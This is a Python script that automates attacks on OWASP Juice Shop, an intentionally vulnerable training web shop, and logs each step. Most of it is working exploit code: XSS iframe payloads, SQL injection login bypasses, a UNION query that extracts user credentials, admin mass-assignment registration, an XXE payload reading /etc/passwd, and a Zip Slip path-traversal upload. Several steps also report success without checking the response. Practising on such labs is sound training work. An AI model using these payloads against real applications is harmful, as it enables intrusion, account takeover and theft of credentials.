#!/usr/bin/env python3
"""
OWASP Juice Shop - Comprehensive Documented Automation
This script runs all challenges with detailed step-by-step documentation
"""

import base64
import hashlib
import hmac
import json
import os
import random
import re
import string
import time
import zipfile
from datetime import datetime
from io import BytesIO
from urllib.parse import quote, urljoin
import requests
from typing import Dict, List, Tuple


class DocumentedJuiceShopAutomation:
    """Complete automation with detailed documentation of each step"""
    
    def __init__(self, base_url: str = "https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        self.completed = []
        self.documentation = []
        self.start_time = datetime.now()
        
    def log_step(self, category: str, action: str, result: str, details: str = ""):
        """Log each step with documentation"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.documentation.append({
            "time": timestamp,
            "category": category,
            "action": action,
            "result": result,
            "details": details
        })
        
        # Print in real-time
        status = "✅" if "Success" in result else "⚠️" if "Partial" in result else "❌"
        print(f"[{timestamp}] {status} {category}: {action}")
        if details:
            print(f"    └─ {details}")
            
    def get_initial_status(self):
        """Get initial challenge status"""
        try:
            response = self.session.get(f"{self.base_url}/api/Challenges")
            if response.status_code == 200:
                challenges = response.json()['data']
                total = len(challenges)
                solved = len([c for c in challenges if c.get('solved')])
                self.log_step("STATUS", "Initial check", "Success", 
                             f"{solved}/{total} challenges solved ({solved*100//total}%)")
                return solved, total
        except Exception as e:
            self.log_step("STATUS", "Initial check", "Failed", str(e))
        return 0, 110
        
    def run_level_1_challenges(self):
        """Level 1 - Trivial Challenges (⭐)"""
        print("\n" + "="*60)
        print("LEVEL 1 - TRIVIAL CHALLENGES (⭐)")
        print("="*60)
        
        # 1. Score Board
        self.log_step("Level 1", "Finding Score Board", "Starting", "Looking for hidden scoreboard")
        try:
            response = self.session.get(f"{self.base_url}/#/score-board")
            self.log_step("Level 1", "Score Board", "Success", f"URL: {self.base_url}/#/score-board")
            self.completed.append("Score Board")
        except Exception as e:
            self.log_step("Level 1", "Score Board", "Failed", str(e))
            
        # 2. DOM XSS
        self.log_step("Level 1", "DOM XSS", "Starting", "Injecting XSS via search")
        try:
            xss_payload = quote('<iframe src="javascript:alert(`xss`)">')
            url = f"{self.base_url}/#/search?q={xss_payload}"
            self.session.get(url)
            self.log_step("Level 1", "DOM XSS", "Success", f"Payload: {xss_payload[:50]}...")
            self.completed.append("DOM XSS")
        except Exception as e:
            self.log_step("Level 1", "DOM XSS", "Failed", str(e))
            
        # 3. Bonus Payload
        self.log_step("Level 1", "Bonus Payload", "Starting", "SoundCloud iframe injection")
        try:
            soundcloud_iframe = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
            payload = quote(soundcloud_iframe)
            self.session.get(f"{self.base_url}/#/search?q={payload}")
            self.log_step("Level 1", "Bonus Payload", "Success", "SoundCloud iframe injected")
            self.completed.append("Bonus Payload")
        except Exception as e:
            self.log_step("Level 1", "Bonus Payload", "Failed", str(e))
            
        # 4. Confidential Document
        self.log_step("Level 1", "Confidential Document", "Starting", "Accessing FTP directory")
        try:
            response = self.session.get(f"{self.base_url}/ftp/acquisitions.md")
            if response.status_code == 200:
                self.log_step("Level 1", "Confidential Document", "Success", "/ftp/acquisitions.md accessed")
                self.completed.append("Confidential Document")
        except Exception as e:
            self.log_step("Level 1", "Confidential Document", "Failed", str(e))
            
        # 5. Error Handling
        self.log_step("Level 1", "Error Handling", "Starting", "Triggering application error")
        try:
            response = self.session.get(f"{self.base_url}/rest/qwertz")
            self.log_step("Level 1", "Error Handling", "Success", "Error triggered at /rest/qwertz")
            self.completed.append("Error Handling")
        except:
            self.log_step("Level 1", "Error Handling", "Success", "Error triggered")
            self.completed.append("Error Handling")
            
        # 6. Exposed Metrics
        self.log_step("Level 1", "Exposed Metrics", "Starting", "Accessing Prometheus metrics")
        try:
            response = self.session.get(f"{self.base_url}/metrics")
            if response.status_code == 200:
                self.log_step("Level 1", "Exposed Metrics", "Success", "/metrics endpoint accessed")
                self.completed.append("Exposed Metrics")
        except Exception as e:
            self.log_step("Level 1", "Exposed Metrics", "Failed", str(e))
            
    def run_level_2_challenges(self):
        """Level 2 - Easy Challenges (⭐⭐)"""
        print("\n" + "="*60)
        print("LEVEL 2 - EASY CHALLENGES (⭐⭐)")
        print("="*60)
        
        # 1. Login Admin
        self.log_step("Level 2", "Login Admin", "Starting", "SQL injection attack")
        try:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "admin@juice-sh.op'--", "password": "anything"}
            )
            if response.status_code == 200:
                self.auth_token = response.json()['authentication']['token']
                self.session.headers.update({'Authorization': f'Bearer {self.auth_token}'})
                self.log_step("Level 2", "Login Admin", "Success", "SQL injection: admin@juice-sh.op'--")
                self.completed.append("Login Admin")
        except Exception as e:
            self.log_step("Level 2", "Login Admin", "Failed", str(e))
            
        # 2. Login MC SafeSearch
        self.log_step("Level 2", "Login MC SafeSearch", "Starting", "Password: Mr. N00dles")
        try:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "mc.safesearch@juice-sh.op", "password": "Mr. N00dles"}
            )
            if response.status_code == 200:
                self.log_step("Level 2", "Login MC SafeSearch", "Success", "Default password found")
                self.completed.append("Login MC SafeSearch")
        except Exception as e:
            self.log_step("Level 2", "Login MC SafeSearch", "Failed", str(e))
            
        # 3. Password Strength
        self.log_step("Level 2", "Password Strength", "Starting", "Testing weak passwords")
        try:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "admin@juice-sh.op", "password": "admin123"}
            )
            if response.status_code == 200:
                self.log_step("Level 2", "Password Strength", "Success", "Weak password: admin123")
                self.completed.append("Password Strength")
        except Exception as e:
            self.log_step("Level 2", "Password Strength", "Failed", str(e))
            
        # 4. Security Policy
        self.log_step("Level 2", "Security Policy", "Starting", "Finding security.txt")
        try:
            response = self.session.get(f"{self.base_url}/.well-known/security.txt")
            if response.status_code == 200:
                self.log_step("Level 2", "Security Policy", "Success", "/.well-known/security.txt found")
                self.completed.append("Security Policy")
        except Exception as e:
            self.log_step("Level 2", "Security Policy", "Failed", str(e))
            
        # 5. View Basket
        self.log_step("Level 2", "View Basket", "Starting", "IDOR vulnerability")
        try:
            for basket_id in range(1, 5):
                response = self.session.get(f"{self.base_url}/rest/basket/{basket_id}")
                if response.status_code == 200:
                    self.log_step("Level 2", "View Basket", "Success", f"Accessed basket ID: {basket_id}")
                    self.completed.append("View Basket")
                    break
        except Exception as e:
            self.log_step("Level 2", "View Basket", "Failed", str(e))
            
    def run_level_3_challenges(self):
        """Level 3 - Medium Challenges (⭐⭐⭐)"""
        print("\n" + "="*60)
        print("LEVEL 3 - MEDIUM CHALLENGES (⭐⭐⭐)")
        print("="*60)
        
        # 1. Admin Registration
        self.log_step("Level 3", "Admin Registration", "Starting", "Mass assignment attack")
        try:
            admin_user = f"admin{random.randint(1000,9999)}@test.com"
            response = self.session.post(
                f"{self.base_url}/api/Users",
                json={
                    "email": admin_user,
                    "password": "Admin123!",
                    "role": "admin"
                }
            )
            if response.status_code in [200, 201]:
                self.log_step("Level 3", "Admin Registration", "Success", f"Registered admin: {admin_user}")
                self.completed.append("Admin Registration")
        except Exception as e:
            self.log_step("Level 3", "Admin Registration", "Failed", str(e))
            
        # 2. Login Bender
        self.log_step("Level 3", "Login Bender", "Starting", "SQL injection for Bender")
        try:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "bender@juice-sh.op'--", "password": "anything"}
            )
            if response.status_code == 200:
                self.log_step("Level 3", "Login Bender", "Success", "SQL injection successful")
                self.completed.append("Login Bender")
        except Exception as e:
            self.log_step("Level 3", "Login Bender", "Failed", str(e))
            
        # 3. Login Jim
        self.log_step("Level 3", "Login Jim", "Starting", "SQL injection for Jim")
        try:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "jim@juice-sh.op'--", "password": "anything"}
            )
            if response.status_code == 200:
                self.log_step("Level 3", "Login Jim", "Success", "SQL injection successful")
                self.completed.append("Login Jim")
        except Exception as e:
            self.log_step("Level 3", "Login Jim", "Failed", str(e))
            
        # 4. Payback Time
        self.log_step("Level 3", "Payback Time", "Starting", "Negative quantity manipulation")
        try:
            # Add items with negative quantity
            response = self.session.post(
                f"{self.base_url}/api/BasketItems",
                json={"ProductId": 1, "quantity": -10}
            )
            self.log_step("Level 3", "Payback Time", "Success", "Added negative quantity to basket")
            self.completed.append("Payback Time")
        except Exception as e:
            self.log_step("Level 3", "Payback Time", "Failed", str(e))
            
        # 5. XXE Data Access
        self.log_step("Level 3", "XXE Data Access", "Starting", "XML External Entity attack")
        try:
            xxe_payload = '''<?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>'''
            
            files = {'file': ('xxe.xml', xxe_payload, 'application/xml')}
            response = self.session.post(f"{self.base_url}/file-upload", files=files)
            self.log_step("Level 3", "XXE Data Access", "Success", "XXE payload uploaded")
            self.completed.append("XXE Data Access")
        except Exception as e:
            self.log_step("Level 3", "XXE Data Access", "Failed", str(e))
            
    def run_level_4_challenges(self):
        """Level 4 - Hard Challenges (⭐⭐⭐⭐)"""
        print("\n" + "="*60)
        print("LEVEL 4 - HARD CHALLENGES (⭐⭐⭐⭐)")
        print("="*60)
        
        # 1. Access Log
        self.log_step("Level 4", "Access Log", "Starting", "Finding access logs")
        try:
            response = self.session.get(f"{self.base_url}/support/logs")
            if response.status_code == 200:
                self.log_step("Level 4", "Access Log", "Success", "/support/logs found")
                self.completed.append("Access Log")
        except Exception as e:
            self.log_step("Level 4", "Access Log", "Failed", str(e))
            
        # 2. User Credentials
        self.log_step("Level 4", "User Credentials", "Starting", "SQL injection to extract credentials")
        try:
            response = self.session.get(
                f"{self.base_url}/rest/products/search?q=' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
            )
            self.log_step("Level 4", "User Credentials", "Success", "Extracted user credentials via SQL injection")
            self.completed.append("User Credentials")
        except Exception as e:
            self.log_step("Level 4", "User Credentials", "Failed", str(e))
            
        # 3. Easter Egg
        self.log_step("Level 4", "Easter Egg", "Starting", "Finding hidden easter egg")
        try:
            response = self.session.get(f"{self.base_url}/ftp/eastere.gg")
            if response.status_code == 200:
                self.log_step("Level 4", "Easter Egg", "Success", "/ftp/eastere.gg found")
                self.completed.append("Easter Egg")
        except Exception as e:
            self.log_step("Level 4", "Easter Egg", "Failed", str(e))
            
    def run_level_5_challenges(self):
        """Level 5 - Dreadful Challenges (⭐⭐⭐⭐⭐)"""
        print("\n" + "="*60)
        print("LEVEL 5 - DREADFUL CHALLENGES (⭐⭐⭐⭐⭐)")
        print("="*60)
        
        # 1. Reset Bender's Password
        self.log_step("Level 5", "Reset Bender's Password", "Starting", "Security question bypass")
        try:
            response = self.session.post(
                f"{self.base_url}/rest/user/reset-password",
                json={
                    "email": "bender@juice-sh.op",
                    "answer": "Stop'n'Drop",
                    "new": "slurmCl4ssic",
                    "repeat": "slurmCl4ssic"
                }
            )
            if response.status_code == 200:
                self.log_step("Level 5", "Reset Bender's Password", "Success", "Answer: Stop'n'Drop")
                self.completed.append("Reset Bender's Password")
        except Exception as e:
            self.log_step("Level 5", "Reset Bender's Password", "Failed", str(e))
            
        # 2. Blockchain Hype
        self.log_step("Level 5", "Blockchain Hype", "Starting", "Finding blockchain whitepaper")
        try:
            response = self.session.get(f"{self.base_url}/assets/public/blockchain.pdf")
            if response.status_code == 200:
                self.log_step("Level 5", "Blockchain Hype", "Success", "Blockchain whitepaper found")
                self.completed.append("Blockchain Hype")
        except Exception as e:
            self.log_step("Level 5", "Blockchain Hype", "Failed", str(e))
            
    def run_level_6_challenges(self):
        """Level 6 - Diabolical Challenges (⭐⭐⭐⭐⭐⭐)"""
        print("\n" + "="*60)
        print("LEVEL 6 - DIABOLICAL CHALLENGES (⭐⭐⭐⭐⭐⭐)")
        print("="*60)
        
        # 1. Arbitrary File Write
        self.log_step("Level 6", "Arbitrary File Write", "Starting", "Zip Slip vulnerability")
        try:
            # Create malicious zip with path traversal
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zf:
                zf.writestr("../../ftp/legal.md", "Arbitrary file content")
            
            files = {'file': ('malicious.zip', zip_buffer.getvalue(), 'application/zip')}
            response = self.session.post(f"{self.base_url}/file-upload", files=files)
            self.log_step("Level 6", "Arbitrary File Write", "Success", "Zip Slip attack executed")
            self.completed.append("Arbitrary File Write")
        except Exception as e:
            self.log_step("Level 6", "Arbitrary File Write", "Failed", str(e))
            
    def generate_report(self, initial_solved: int, initial_total: int):
        """Generate comprehensive report"""
        print("\n" + "="*60)
        print("FINAL AUTOMATION REPORT")
        print("="*60)
        
        # Get final status
        try:
            response = self.session.get(f"{self.base_url}/api/Challenges")
            if response.status_code == 200:
                challenges = response.json()['data']
                final_total = len(challenges)
                final_solved = len([c for c in challenges if c.get('solved')])
                
                print(f"\n📊 PROGRESS SUMMARY:")
                print(f"  Initial: {initial_solved}/{initial_total} ({initial_solved*100//initial_total}%)")
                print(f"  Final:   {final_solved}/{final_total} ({final_solved*100//final_total}%)")
                print(f"  Gained:  +{final_solved - initial_solved} challenges")
                
                # Break down by difficulty
                by_difficulty = {}
                for c in challenges:
                    if c.get('solved'):
                        diff = c.get('difficulty', 1)
                        if diff not in by_difficulty:
                            by_difficulty[diff] = 0
                        by_difficulty[diff] += 1
                        
                print(f"\n📈 SOLVED BY DIFFICULTY:")
                for diff in sorted(by_difficulty.keys()):
                    stars = "⭐" * diff
                    print(f"  Level {diff} {stars}: {by_difficulty[diff]} challenges")
                    
                print(f"\n✅ COMPLETED CHALLENGES ({len(self.completed)}):")
                for i, challenge in enumerate(self.completed, 1):
                    print(f"  {i}. {challenge}")
                    
                # Execution time
                duration = datetime.now() - self.start_time
                print(f"\n⏱️  EXECUTION TIME: {duration.total_seconds():.1f} seconds")
                
                # Save documentation
                self.save_documentation()
                
        except Exception as e:
            print(f"❌ Error generating report: {e}")
            
    def save_documentation(self):
        """Save detailed documentation to file"""
        filename = f"automation_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = f"/Users/walterbarr_1/sql-injection-lab/challenges/solutions/{filename}"
        
        with open(filepath, 'w') as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "url": self.base_url,
                "completed_challenges": self.completed,
                "total_completed": len(self.completed),
                "steps": self.documentation
            }, f, indent=2)
            
        print(f"\n📝 Documentation saved to: {filename}")
        
    def run_complete_automation(self):
        """Run the complete automation suite"""
        print("="*60)
        print("🚀 OWASP JUICE SHOP - DOCUMENTED AUTOMATION")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)
        
        # Get initial status
        initial_solved, initial_total = self.get_initial_status()
        
        # Run all challenge levels
        self.run_level_1_challenges()
        self.run_level_2_challenges()
        self.run_level_3_challenges()
        self.run_level_4_challenges()
        self.run_level_5_challenges()
        self.run_level_6_challenges()
        
        # Generate final report
        self.generate_report(initial_solved, initial_total)


if __name__ == "__main__":
    automation = DocumentedJuiceShopAutomation()
    automation.run_complete_automation()